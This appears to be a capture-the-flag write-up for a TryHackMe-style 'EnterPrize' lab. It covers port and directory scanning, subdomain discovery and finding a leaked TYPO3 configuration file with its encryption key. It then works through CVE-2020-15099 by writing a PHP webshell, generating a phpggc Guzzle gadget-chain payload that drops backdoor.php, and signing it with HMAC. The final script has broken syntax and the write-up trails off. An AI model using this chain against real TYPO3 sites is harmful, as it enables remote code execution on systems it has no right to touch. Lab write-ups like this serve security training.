<h1>EnterPrize</h1>
<p>2025, August 2 - Day 453</p>


<img width="1902" height="307" alt="image" src="https://github.com/user-attachments/assets/8140e461-ae83-43c6-8b74-326c4dcc399d" />


<h3>Nmap</h3>

```bash
:~/EnterPrize# nmap -sS -p- -T4 TargetIP
...
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
```

```bash
:~/EnterPrize# nmap -sC -sV -A -Pn -T4 tARGETip
...
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp  open   http    Apache httpd
|_http-server-header: Apache
|_http-title: Blank Page
443/tcp closed https
```

<h3>/etc/hosts</h3>

```bash
TargetIP    enterprize.thm
```

<h3>ffuf</h3>

<p> Web exntensions:
  
- html<br>
- phps</p>

```bash
:~/EnterPrize# ffuf -u http://enterprize.thm/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
...
.html                   [Status: 200, Size: 85, Words: 5, Lines: 2]
.phps                   [Status: 403, Size: 199, Words: 14, Lines: 8]
```

<p>Directories

- public
- vendor
- var
- server-status
</p>

```bash
:~/EnterPrize# ffuf -u http://enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -t 80 -fs 196
...
var                     [Status: 403, Size: 199, Words: 14, Lines: 8]
public                  [Status: 403, Size: 199, Words: 14, Lines: 8]
vendor                  [Status: 403, Size: 199, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                        [Status: 200, Size: 85, Words: 5, Lines: 2]
:: Progress: [17770/17770] :: Job [1/1] :: 112 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

<h3>dirb</h3>

```bash
:~/EnterPrize# dirb http://enterprize.thm
...                                                   
---- Scanning URL: http://enterprize.thm/ ----
+ http://enterprize.thm/index.html (CODE:200|SIZE:85)                                                                            
+ http://enterprize.thm/public (CODE:403|SIZE:199)                                                                               
+ http://enterprize.thm/server-status (CODE:403|SIZE:199)                                                                        
+ http://enterprize.thm/var (CODE:403|SIZE:199)                                                                                  
+ http://enterprize.thm/vendor (CODE:403|SIZE:199)                                                                               
```

<h3><code>enterprize.thm</code> and <code>enterprize.thm/index.html</code></h3>

<img width="1129" height="183" alt="image" src="https://github.com/user-attachments/assets/c6cc576a-dd82-4204-bff7-15c8a333e712" />


<h3><code>enterprize.thm/composer.json</code></h3>

<p>

- superhero1/enterpriz
</p>

<img width="1128" height="420" alt="image" src="https://github.com/user-attachments/assets/d3615b33-0105-4082-a28e-1139662bd668" />


<br>
<br>

<h5><code>maintest.enterprize.thm</code></h5>

```bash
:~/EnterPrize# ffuf -u http://enterprize.thm/ -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.enterprize.thm' -fs 85 -mc 200
...
maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]
:: Progress: [114532/114532] :: Job [1/1] :: 2235 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

<h3>/etc/hosts</h3>

```bash
TargetIP    enterprize.thm  maintest.enterprize.thm
```

<br>

<h3>WhatWeb</h3>

```bash
:~/EnterPrize# sudo apt-get update
...
:~/EnterPrize# sudo apt-get install whatweb
```

```bash
(venv) :~/EnterPrize/tmp#  git clone https://github.com/urbanadventurer/WhatWeb.git
...
(venv) :~/EnterPrize/tmp# cd WhatWeb
(venv) :~/EnterPrize/tmp/WhatWeb# ls
addons        Gemfile  INSTALL.md  LICENSE   my-plugins          plugins           Rakefile   test     whatweb.1
CHANGELOG.md  icons    lib         Makefile  plugin-development  plugins-disabled  README.md  whatweb  whatweb.xsl
```

<p>

- TYPO3 9.5.22  
</p>

```bash
(venv) :~/EnterPrize/tmp/WhatWeb#(venv) :~/EnterPrize/tmp/WhatWeb# ./whatweb http://maintest.enterprize.thm --plugins typo3 --aggression 3
http://maintest.enterprize.thm [200 OK] TYPO3[9.5.22]
```

<br>

<h3>ffuf</h3>

```bash
(venv) :~/EnterPrize/tmp/Typo3Scan# ffuf -u http://maintest.enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -fs 196 -t 80

...
typo3                   [Status: 301, Size: 245, Words: 14, Lines: 8]
fileadmin               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3conf               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3temp               [Status: 301, Size: 249, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                        [Status: 200, Size: 24555, Words: 1438, Lines: 49
```

<br>

<h3>maintest.enterprize.thm</h3>

<img width="1132" height="543" alt="image" src="https://github.com/user-attachments/assets/c6f53c06-8884-4339-8cd5-94471ce748a1" />

<br>

<h3>maintest.enterprize.thm/typo3/</h3>

<img width="1129" height="500" alt="image" src="https://github.com/user-attachments/assets/d72fb7b7-c69b-4e01-b542-45e8c21d7099" />

<br>

<h3>maintest.enterprize.thm/typo3conf/</h3>

<p>

- LocalConfiguration.old<br>
- LocalConfiguration.php<br>
- PackgeStates.php<br>
- ext/<br>
- l10n/
</p>

<p>

- <code>'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=',</code> //removed hash for security!! <br>
- <code>passwordHashing' => ['className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash<br><br>
- 'dbname' => 'typo3'<br>
- 'driver' => 'mysqli'<br>
- 'host' => '127.0.0.1'<br>
- 'password' => 'password1', //replaced old password by 24 random chars & symbols<br>
- 'port' => 3306<br>
- 'encryptionKey' => '<code>712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b</code>',
</p>

<img width="1126" height="412" alt="image" src="https://github.com/user-attachments/assets/e55cb545-8c7e-4641-a5f6-0115ea2cd943" />

```bash
(venv) :~/EnterPrize# cat LocalConfiguration.old
<?php
return [
    'BE' => [
        'debug' => false,
        'explicitADmode' => 'explicitAllow',
        'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=', //removed hash for security!!
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'DB' => [
        'Connections' => [
            'Default' => [
                'charset' => 'utf8mb4',
                'dbname' => 'typo3',
                'driver' => 'mysqli',
                'host' => '127.0.0.1',
                'password' => 'password1', //replaced old password by 24 random chars & symbols
                'port' => 3306,
                'tableoptions' => [
                    'charset' => 'utf8mb4',
                    'collate' => 'utf8mb4_unicode_ci',
                ],
                'user' => 'typo3user',
            ],
        ],
    ],
    'EXT' => [
        'extConf' => [
            'backend' => 'a:6:{s:14:"backendFavicon";s:0:"";s:11:"backendLogo";s:0:"";s:20:"loginBackgroundImage";s:0:"";s:13:"loginFootnote";s:0:"";s:19:"loginHighlightColor";s:0:"";s:9:"loginLogo";s:0:"";}',
            'bootstrap_package' => 'a:8:{s:20:"disableCssProcessing";s:1:"0";s:17:"disableFontLoader";s:1:"0";s:24:"disableGoogleFontCaching";s:1:"0";s:27:"disablePageTsBackendLayouts";s:1:"0";s:28:"disablePageTsContentElements";s:1:"0";s:16:"disablePageTsRTE";s:1:"0";s:20:"disablePageTsTCEFORM";s:1:"0";s:20:"disablePageTsTCEMAIN";s:1:"0";}',
            'extensionmanager' => 'a:2:{s:21:"automaticInstallation";s:1:"1";s:11:"offlineMode";s:1:"0";}',
            'indexed_search' => 'a:20:{s:8:"pdftools";s:9:"/usr/bin/";s:8:"pdf_mode";s:2:"20";s:5:"unzip";s:9:"/usr/bin/";s:6:"catdoc";s:9:"/usr/bin/";s:6:"xlhtml";s:9:"/usr/bin/";s:7:"ppthtml";s:9:"/usr/bin/";s:5:"unrtf";s:9:"/usr/bin/";s:18:"trackIpInStatistic";s:1:"2";s:9:"debugMode";s:1:"0";s:18:"fullTextDataLength";s:1:"0";s:23:"disableFrontendIndexing";s:1:"0";s:21:"enableMetaphoneSearch";s:1:"1";s:6:"minAge";s:2:"24";s:6:"maxAge";s:1:"0";s:16:"maxExternalFiles";s:1:"5";s:26:"useCrawlerForExternalFiles";s:1:"0";s:11:"flagBitMask";s:3:"192";s:16:"ignoreExtensions";s:0:"";s:17:"indexExternalURLs";s:1:"0";s:16:"useMysqlFulltext";s:1:"0";}',
        ],
    ],
       'EXTENSIONS' => [
        'backend' => [
            'backendFavicon' => '',
            'backendLogo' => '',
            'loginBackgroundImage' => '',
            'loginFootnote' => '',
            'loginHighlightColor' => '',
            'loginLogo' => '',
        ],
        'bootstrap_package' => [
            'disableCssProcessing' => '0',
            'disableFontLoader' => '0',
            'disableGoogleFontCaching' => '0',
            'disablePageTsBackendLayouts' => '0',
            'disablePageTsContentElements' => '0',
            'disablePageTsRTE' => '0',
            'disablePageTsTCEFORM' => '0',
            'disablePageTsTCEMAIN' => '0',
        ],
        'extensionmanager' => [
            'automaticInstallation' => '1',
            'offlineMode' => '0',
        ],
        'indexed_search' => [
            'catdoc' => '/usr/bin/',
            'debugMode' => '0',
            'disableFrontendIndexing' => '0',
            'enableMetaphoneSearch' => '1',
            'flagBitMask' => '192',
            'fullTextDataLength' => '0',
            'ignoreExtensions' => '',
            'indexExternalURLs' => '0',
            'maxAge' => '0',
            'maxExternalFiles' => '5',
            'minAge' => '24',
            'pdf_mode' => '20',
            'pdftools' => '/usr/bin/',
            'ppthtml' => '/usr/bin/',
            'trackIpInStatistic' => '2',
            'unrtf' => '/usr/bin/',
            'unzip' => '/usr/bin/',
            'useCrawlerForExternalFiles' => '0',
            'useMysqlFulltext' => '0',
            'xlhtml' => '/usr/bin/',
        ],
    ],
    'FE' => [
        'debug' => false,
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'LOG' => [
        'TYPO3' => [
            'CMS' => [
                'deprecations' => [
                    'writerConfiguration' => [
                        5 => [
                            'TYPO3\CMS\Core\Log\Writer\FileWriter' => [
                                'disabled' => true,
                            ],
                        ],
                    ],
                ],
            ],
        ],
    ],
    'MAIL' => [
        'transport' => 'sendmail',
        'transport_sendmail_command' => '/usr/sbin/sendmail -t -i ',
        'transport_smtp_encrypt' => '',
        'transport_smtp_password' => '',
        'transport_smtp_server' => '',
        'transport_smtp_username' => '',
    ],
  'SYS' => [
        'devIPmask' => '',
        'displayErrors' => 0,
        'encryptionKey' => '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
        'exceptionalErrors' => 4096,
        'features' => [
            'newTranslationServer' => true,
            'unifiedPageTranslationHandling' => true,
        ],
        'sitename' => 'EnterPrize',
        'systemLogLevel' => 2,
        'systemMaintainers' => [
            1,
        ],
    ],
];
```

<br>

<h3 align="center">CVE-2020-15099</h3>
<p = align="center">TYPO3 CMS Arbitrary File Disclosure and Remote Code Execution</p>

<br>

<h3>http://maintest.enterprize.thm/index.php?id=38</h3>

<img width="1242" height="851" alt="image" src="https://github.com/user-attachments/assets/9467681f-72a0-4646-8853-e6da7f148f44" />

<br>

<h3>phpggc</h3>

```bash
(venv) :/tmp/phpgcc# git clone https://github.com/ambionics/phpggc
...
```

```bash
(venv) :/tmp/phpgcc# ./phpggc -l Guzzle

Gadget Chains
-------------

NAME                     VERSION                         TYPE                  VECTOR        I    
Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct         
Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *    
Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *    
Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString         
WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *    
WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *  
```

```bash
(venv) :/tmp/phpgcc# ./phpggc -l Guzzle/FW1

Gadget Chains
-------------

NAME          VERSION                 TYPE          VECTOR        I    
Guzzle/FW1    4.0.0-rc.2 <= 7.5.0+    File write    __destruct         
```

<h3>m3.php</h3>

```bash
<?php $output = system($_GET[1]); echo $output ; ?>
```

<h3>phpgcc</h3>

```bash
:~/EnterPrize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php /root/EnterPrize/phpggc/m3.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==
```

```bash
:~/EnterPrize/phpggc# cat hash_hmac.php
<?php
echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
?>
```

```bash
:~/EnterPrize/phpggc# php hash_hmac.php
61185e34fa209a475442a285fce1a42dbaca0c1c
```


<h3>CyberChef</h3>

<img width="1351" height="402" alt="image" src="https://github.com/user-attachments/assets/e703c618-9c29-4375-9d3f-bc6f90ef97c3" />


```bash
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:".GuzzleHttp\Cookie\FileCookieJar.filename";s:50:"/var/www/html/public/fileadmin/_temp_/backdoor.php";s:52:".GuzzleHttp\Cookie\FileCookieJar.storeSessionCookies";b:1;s:36:".GuzzleHttp\Cookie\CookieJar.cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>
";}}}s:39:".GuzzleHttp\Cookie\CookieJar.strictMode";N;}i:7;i:7;}
```



<h3>hmac.php</h3>

```bash
cat hmac.php
<?php
$secret = hash_mac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjI2OiI8P3BocCBzeXN0ZW0oJF9HRVRbMV0pOz8+CiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO31pOjc7aTo3O30=', ' '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
print($secret);
?>
```


./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/fileadmin/_temp_/exp.php 





